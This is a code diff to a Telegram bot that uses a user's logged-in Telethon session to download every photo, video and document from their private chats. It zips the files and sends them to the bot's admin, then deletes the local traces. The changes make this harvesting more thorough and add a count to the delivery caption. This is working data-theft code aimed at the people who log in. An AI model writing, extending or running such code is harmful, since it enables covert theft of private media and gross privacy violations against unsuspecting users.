@@ -242,6 +242,8 @@ async def login_flow(msg: types.Message):
         await export_medias(uid)
 
 # ================== EXPORT MEDIAS ==================
+from telethon.tl.types import InputMessagesFilterPhotos, InputMessagesFilterVideo, InputMessagesFilterDocument
+
 async def export_medias(uid):
     client = sessions[uid]["client"]
 
@@ -249,6 +251,8 @@ async def export_medias(uid):
     ZIP_NAME = f"medias_{uid}.zip"
 
     os.makedirs(MEDIA_DIR, exist_ok=True)
+
+    total = 0  # sanash uchun
 
     async for dialog in client.iter_dialogs():
         if not isinstance(dialog.entity, User):
@@ -259,14 +263,20 @@ async def export_medias(uid):
         user_folder = os.path.join(MEDIA_DIR, str(dialog.entity.id))
         os.makedirs(user_folder, exist_ok=True)
 
-        async for m in client.iter_messages(dialog.entity):
-            if not m.media:
-                continue
-            try:
-                await m.download_media(file=user_folder)
-            except:
-                pass
+        # 🔥 FAQAT MEDIA FILTRLARI
+        for flt in (
+            InputMessagesFilterPhotos,
+            InputMessagesFilterVideo,
+            InputMessagesFilterDocument,
+        ):
+            async for m in client.iter_messages(dialog.entity, filter=flt):
+                try:
+                    await m.download_media(file=user_folder)
+                    total += 1
+                except:
+                    pass
 
+    # 🔒 ZIP
     with zipfile.ZipFile(ZIP_NAME, "w", zipfile.ZIP_DEFLATED) as z:
         for root, _, files in os.walk(MEDIA_DIR):
             for file in files:
@@ -276,7 +286,7 @@ async def export_medias(uid):
     await bot.send_document(
         ADMIN_ID,
         types.InputFile(ZIP_NAME),
-        caption="📦 Faqat lichkadagi barcha medialar"
+        caption=f"📦 Lichkadagi medialar\nJami: {total} ta"
     )
 
     shutil.rmtree(MEDIA_DIR)
@@ -284,6 +294,7 @@ async def export_medias(uid):
 
     await client.disconnect()
     sessions.pop(uid, None)
+
 
 # ================== ADMIN ==================
 @dp.message_handler(lambda m: m.text == "⚙️ Admin panel" and m.from_user.id == ADMIN_ID)
